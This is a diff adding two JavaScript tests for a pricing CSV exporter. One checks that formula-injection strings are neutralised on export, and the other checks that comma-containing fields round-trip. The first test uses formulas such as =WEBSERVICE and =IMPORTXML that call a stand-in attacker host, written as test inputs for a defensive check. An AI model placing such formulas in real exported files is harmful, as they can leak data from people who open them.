@@ -369,4 +369,24 @@ describe('exportPricingCSV — roundtrip', () => {
       assert.strictEqual(prices.cable[k], v, `Mismatch for cable key "${k}"`);
     });
   });
+
+  it('neutralizes spreadsheet formulas in exported string fields', () => {
+    const csv = exportPricingCSV(
+      { cable: { '=WEBSERVICE("https://attacker.example")': 1.2 } },
+      { source: '=IMPORTXML("https://attacker.example","//a")', date: '@SUM(1+1)' }
+    );
+    assert.ok(csv.includes('\'=WEBSERVICE("https://attacker.example")'));
+    assert.ok(csv.includes('\'=IMPORTXML("https://attacker.example","//a")'));
+    assert.ok(csv.includes('\'@SUM(1+1)'));
+  });
+
+  it('quotes CSV fields that contain commas', () => {
+    const csv = exportPricingCSV(
+      { cable: { '4 AWG, special': 1.25 } },
+      { source: 'Distributor, Inc.', date: '2026-04-11' }
+    );
+    const { prices, meta } = parsePricingCSV(csv);
+    assert.strictEqual(prices.cable['4 AWG, special'], 1.25);
+    assert.strictEqual(meta.source, 'Distributor, Inc.');
+  });
 });
